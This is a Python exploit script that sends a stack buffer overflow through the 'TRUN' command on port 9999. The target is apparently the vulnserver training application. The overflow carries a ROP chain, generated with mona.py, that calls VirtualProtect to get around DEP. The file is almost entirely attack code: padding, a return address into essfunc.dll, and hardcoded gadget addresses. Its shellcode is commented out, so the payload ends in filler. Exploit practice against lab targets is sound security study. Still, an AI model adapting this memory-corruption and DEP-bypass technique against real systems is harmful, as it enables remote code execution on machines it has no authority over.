#!/usr/bin/env python3

#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        0x7699cfcf,  # POP ESI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x62508128,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        0x77083491,  # MOV ESI,DWORD PTR DS:[ESI] # ADD AL,0 # MOV EAX,8007007F # RETN 0x18 [KERNELBASE.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebp:---]
        0x770988dc,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x625014e6,  # & jmp esp [essfunc.dll]
        #[---INFO:gadgets_to_set_ebx:---]
        0x77508b1d,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x7692da18,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x769a80d2,  # XCHG EAX,EBX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_edx:---]
        0x7707f452,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x76d39914,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
        0x7743a4b2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        0x7678816a,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
        0x765e3bf2,  # &Writable location [WS2_32.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        0x7747e114,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x765a77c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        0x77095618,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x76f8af08,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 2003 +
    # 62501135   5D               POP EBP
    struct.pack('<L', 0x6250129D) + 
    create_rop_chain() +
    # # xor eax,eax 
    # b'\x31\xc0' +
    # # add eax,abcdabb9
    # b'\x05\xb9\xab\xcd\xab' +
    # # inc eax
    # b'\40' +    
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)